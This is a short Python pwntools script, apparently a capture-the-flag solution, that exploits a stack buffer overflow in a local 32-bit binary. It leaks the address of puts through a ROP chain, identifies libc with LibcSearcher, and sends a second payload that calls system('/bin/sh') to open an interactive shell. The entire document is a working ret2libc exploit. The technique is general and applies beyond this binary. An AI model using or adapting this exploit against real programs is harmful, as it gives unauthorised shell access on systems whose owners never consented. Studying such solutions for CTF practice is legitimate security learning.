from pwn import *
from LibcSearcher import LibcSearcher
context(log_level = 'debug')
p = process('./pwn')
e = ELF('./pwn')
p.recv()
payload1 = flat(['a' * 0x20, e.plt['puts'], 0x0804859F, e.got['puts']])
p.sendline(payload1)
length = len(payload1)
puts_addr = u32(p.recv()[length+1:length+5])
libc = LibcSearcher('puts', puts_addr)
libcbase = puts_addr - libc.dump('puts')
p.sendline(flat(['a' * 0x1c, 'b' * 0x4, libcbase + libc.dump('system'), 0xdeadbeef, libcbase + libc.dump('str_bin_sh')]))
p.interactive()
